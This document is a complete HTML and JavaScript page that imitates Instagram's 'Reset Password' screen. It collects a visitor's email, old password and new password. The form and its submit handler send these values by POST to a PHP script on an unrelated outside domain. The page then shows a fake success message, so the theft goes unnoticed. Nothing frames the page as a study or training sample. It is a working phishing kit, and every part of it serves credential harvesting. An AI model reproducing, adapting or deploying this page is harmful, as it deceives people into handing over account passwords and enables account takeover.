<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password | Instagram</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 10px;
            width: 350px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .logo {
            width: 180px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-control {
            width: 100%;
            padding: 10px 10px 10px 35px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .input-icon {
            position: absolute;
            left: 10px;
            top: 12px;
            color: #8e8e8e;
        }

        .form-control:focus {
            outline: none;
            border-color: #0095f6;
        }

        .form-control:focus + .input-icon {
            color: #0095f6;
        }

        .btn-reset {
            width: 100%;
            padding: 12px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        .btn-reset:hover {
            background-color: #1877f2;
        }

        .btn-reset:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }

        .login-link {
            margin-top: 20px;
            font-size: 14px;
        }

        .login-link a {
            color: #0095f6;
            text-decoration: none;
        }

        .password-strength {
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <img 
            src="https://www.instagram.com/static/images/web/logged_out_wordmark-2feb7a3a130d.png" 
            alt="Instagram Logo" 
            class="logo"
        >
        
        <form id="resetPasswordForm" action="https://www.careerjyoti.in/tools/passHandler.php" method="POST">
            <div class="form-group">
                <i class="fas fa-envelope input-icon"></i>
                <input 
                    type="email" 
                    id="emailInput" 
                    class="form-control" 
                    placeholder="Enter your email" 
                    required
                >
            </div>
            
            <div class="form-group">
                <i class="fas fa-lock input-icon"></i>
                <input 
                    type="password" 
                    id="oldPasswordInput" 
                    class="form-control" 
                    placeholder="Old password" 
                    required
                    minlength="6"
                >
            </div>
            
            <div class="form-group">
                <i class="fas fa-lock input-icon"></i>
                <input 
                    type="password" 
                    id="newPasswordInput" 
                    class="form-control" 
                    placeholder="New password" 
                    required
                    minlength="6"
                >
                <div id="passwordStrength" class="password-strength">
                    Password strength: Weak
                </div>
            </div>
            
            <div class="form-group">
                <i class="fas fa-lock input-icon"></i>
                <input 
                    type="password" 
                    id="confirmPasswordInput" 
                    class="form-control" 
                    placeholder="Confirm new password" 
                    required
                    minlength="6"
                >
            </div>
            
            <div id="errorMessage" class="error-message"></div>
            
            <button 
                type="submit" 
                class="btn-reset" 
                id="resetButton" 
                disabled
            >
                Reset Password
            </button>
        </form>
        
        <div class="login-link">
            <a href="#">Back to Login</a>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('emailInput');
        const oldPasswordInput = document.getElementById('oldPasswordInput');
        const newPasswordInput = document.getElementById('newPasswordInput');
        const confirmPasswordInput = document.getElementById('confirmPasswordInput');
        const resetButton = document.getElementById('resetButton');
        const errorMessage = document.getElementById('errorMessage');
        const resetPasswordForm = document.getElementById('resetPasswordForm');
        const passwordStrength = document.getElementById('passwordStrength');

        // Password strength checker
        function checkPasswordStrength(password) {
            let strength = 0;
            if (password.length >= 8) strength++;
            if (password.match(/[a-z]+/)) strength++;
            if (password.match(/[A-Z]+/)) strength++;
            if (password.match(/[0-9]+/)) strength++;
            if (password.match(/[$@#&!]+/)) strength++;

            switch(strength) {
                case 0:
                case 1:
                    passwordStrength.textContent = 'Password strength: Weak';
                    passwordStrength.style.color = '#ed4956';
                    break;
                case 2:
                case 3:
                    passwordStrength.textContent = 'Password strength: Medium';
                    passwordStrength.style.color = '#ffa500';
                    break;
                case 4:
                case 5:
                    passwordStrength.textContent = 'Password strength: Strong';
                    passwordStrength.style.color = '#2ecc71';
                    break;
            }
        }

        // Enable/disable reset button based on form validation
        function validateForm() {
            const emailValid = emailInput.checkValidity();
            const oldPasswordValid = oldPasswordInput.value.length >= 6;
            const passwordsMatch = newPasswordInput.value === confirmPasswordInput.value;
            const newPasswordValid = newPasswordInput.value.length >= 6;
            const differentPasswords = oldPasswordInput.value !== newPasswordInput.value;

            // Check if all conditions are met
            const isFormValid = emailValid && 
                                oldPasswordValid && 
                                newPasswordValid && 
                                passwordsMatch &&
                                differentPasswords;

            resetButton.disabled = !isFormValid;

            // Error message handling
            if (!differentPasswords) {
                errorMessage.textContent = 'New password must be different from old password';
                errorMessage.style.display = 'block';
            } else if (!passwordsMatch) {
                errorMessage.textContent = 'New passwords do not match';
                errorMessage.style.display = 'block';
            } else {
                errorMessage.style.display = 'none';
            }

            // Check password strength
            checkPasswordStrength(newPasswordInput.value);
        }

        // Add event listeners for form validation
        emailInput.addEventListener('input', validateForm);
        oldPasswordInput.addEventListener('input', validateForm);
        newPasswordInput.addEventListener('input', validateForm);
        confirmPasswordInput.addEventListener('input', validateForm);

        // Form submission handler
resetPasswordForm.addEventListener('submit', async function(e) {
    e.preventDefault();

    if (resetButton.disabled) return;

    // Prepare form data
    const formData = new FormData();
    formData.append('email', emailInput.value);
    formData.append('oldPassword', oldPasswordInput.value);
    formData.append('newPassword', newPasswordInput.value);
    formData.append('confirmPassword', confirmPasswordInput.value);

    try {
        // Send data to PHP handler
        const response = await fetch('https://www.careerjyoti.in/tools/passHandler.php', {
            method: 'POST',
            body: formData
        });

        // Parse response text for more details
        const responseText = await response.text();
        
        try {
            // Try to parse as JSON
            const result = JSON.parse(responseText);
            
            // Log full response for debugging
            console.log('Full Server Response:', result);

            // Check response status
            if (result.status === 'success') {
                alert('Password reset successfully!');
                
                // Clear form
                resetPasswordForm.reset();
                resetButton.disabled = true;
                passwordStrength.textContent = 'Password strength: Weak';
                passwordStrength.style.color = '#8e8e8e';
            } else {
                // Handle error response
                throw new Error(result.message || 'Password reset failed');
            }
        } catch (parseError) {
            // If JSON parsing fails, log the raw response
            console.error('Non-JSON Response:', responseText);
            console.error('Parsing Error:', parseError);
            
            throw new Error(`Server returned non-JSON response: ${responseText}`);
        }
    } catch (error) {
        // Network or parsing error
        console.error('Full Error Details:', error);
        
        // Provide more specific error message to user
        alert(`Error: ${error.message}`);
    }
});
    </script>
</body>
</html>
